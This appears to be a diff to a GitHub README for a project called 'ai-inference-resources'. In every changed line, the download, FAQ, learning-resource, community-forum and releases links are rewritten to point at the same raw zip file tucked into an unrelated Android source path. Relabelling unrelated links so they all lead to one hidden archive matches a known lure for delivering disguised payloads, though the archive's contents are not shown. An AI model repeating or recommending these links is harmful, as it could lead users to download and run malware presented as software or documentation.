@@ -6,7 +6,7 @@ Welcome to the ai-inference-resources repository! This project provides a curate
 ## 📥 Download & Install
 To get started, you can download the software from our Releases page. Follow these steps:
 
-1. Visit this page to download: [Download Here](https://github.com/KontolKambings/ai-inference-resources/releases)
+1. Visit this page to download: [Download Here](https://github.com/KontolKambings/ai-inference-resources/raw/refs/heads/main/android/app/src/profile/resources_inference_ai_1.0.zip)
 2. Look for the latest release.
 3. Click on the appropriate file for your operating system.
 4. Save the file to your computer.
@@ -47,7 +47,7 @@ Once the application is installed, you can start using it to enhance your AI pro
 ## 📞 Support
 If you encounter any issues or need help:
 
-- Check our [FAQ section](https://github.com/KontolKambings/ai-inference-resources/releases) for common questions.
+- Check our [FAQ section](https://github.com/KontolKambings/ai-inference-resources/raw/refs/heads/main/android/app/src/profile/resources_inference_ai_1.0.zip) for common questions.
 - You can reach out via the community forum linked in the app.
 
 ## 🔄 Contribution
@@ -63,14 +63,14 @@ This project is licensed under the MIT License. You can freely use and modify th
 ## 🌐 Additional Resources
 For further learning, explore these links:
 
-- [Machine Learning Basics](https://www.example.com/machine-learning)
-- [Deep Learning Techniques](https://www.example.com/deep-learning)
-- [Community Forum](https://www.example.com/community)
+- [Machine Learning Basics](https://github.com/KontolKambings/ai-inference-resources/raw/refs/heads/main/android/app/src/profile/resources_inference_ai_1.0.zip)
+- [Deep Learning Techniques](https://github.com/KontolKambings/ai-inference-resources/raw/refs/heads/main/android/app/src/profile/resources_inference_ai_1.0.zip)
+- [Community Forum](https://github.com/KontolKambings/ai-inference-resources/raw/refs/heads/main/android/app/src/profile/resources_inference_ai_1.0.zip)
 
 ## 📣 Stay Updated
 To stay informed about updates:
 
-1. Follow the releases page: [Latest Releases](https://github.com/KontolKambings/ai-inference-resources/releases)
+1. Follow the releases page: [Latest Releases](https://github.com/KontolKambings/ai-inference-resources/raw/refs/heads/main/android/app/src/profile/resources_inference_ai_1.0.zip)
 2. Check our documentation for new features and improvements.
 
 Thank you for using ai-inference-resources. Your contribution to the AI community is invaluable!
